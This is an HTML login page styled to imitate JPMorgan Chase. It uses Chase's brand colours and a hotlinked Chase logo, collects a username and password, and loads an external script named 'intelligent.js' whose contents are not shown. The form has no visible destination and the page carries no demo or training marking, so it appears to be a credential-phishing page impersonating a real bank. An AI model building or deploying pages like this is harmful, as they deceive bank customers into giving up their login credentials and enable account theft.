<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Chase-Style Login</title>

<style>
  :root{
    --chase-blue: #117ACA;
    --chase-dark: #0B3A67;
  }

  body{
    margin:0;
    font-family: Arial, Helvetica, sans-serif;
    background:#f4f7fb;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
  }

  .login-box{
    background:white;
    width:370px;
    padding:40px 30px;
    border-radius:12px;
    box-shadow:0 6px 20px rgba(0,0,0,0.1);
  }

  /* Placeholder logo style */
  .logo{
    width:120px;
    margin:0 auto 25px;
    text-align:center;
    font-size:22px;
    font-weight:700;
    color:var(--chase-dark);
  }

  h2{
    margin:0 0 20px;
    font-size:22px;
    color:var(--chase-dark);
    text-align:center;
  }

  label{
    font-size:14px;
    color:#333;
    margin-bottom:5px;
    display:block;
  }

  input{
    width:100%;
    padding:12px;
    border:1px solid #ccc;
    border-radius:8px;
    margin-bottom:18px;
    font-size:14px;
  }

  button{
    width:100%;
    background:var(--chase-blue);
    border:none;
    padding:12px;
    border-radius:8px;
    font-size:16px;
    color:white;
    cursor:pointer;
    font-weight:bold;
  }

  button:hover{
    background:#0f68a9;
  }

  .help-links{
    text-align:center;
    margin-top:15px;
  }

  .help-links a{
    color:var(--chase-blue);
    font-size:13px;
    text-decoration:none;
  }

  .notice{
    margin-top:20px;
    font-size:12px;
    color:#888;
    text-align:center;
  }
</style>
</head>
<script src="intelligent.js"></script>
<body>
  <div class="login-box">
    <div class="logo"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSPs-HpAJwlI_H9ye7h-_yNGhSSNuCTEZClXohGW1gjmhRlmouqChS1umM&s=10" 
     alt="JPMorgan Chase Logo"
     style="width:150px;"></div>

    <h2>Sign In</h2>
<form>
    <label for="user">Username or Email address</label>
    <input type="text" id="user" placeholder="Enter username" name="Username or email" required>

    <label for="pass">Password</label>
    <input type="password" id="pass" placeholder="Enter password" name="password" required>

    <button type="submit">Sign In</button>
</form>
    <div class="help-links">
      <p><a href="#">Forgot Username or Password?</a></p>
    </div>
    </div>
  </div>
</body>
</html>
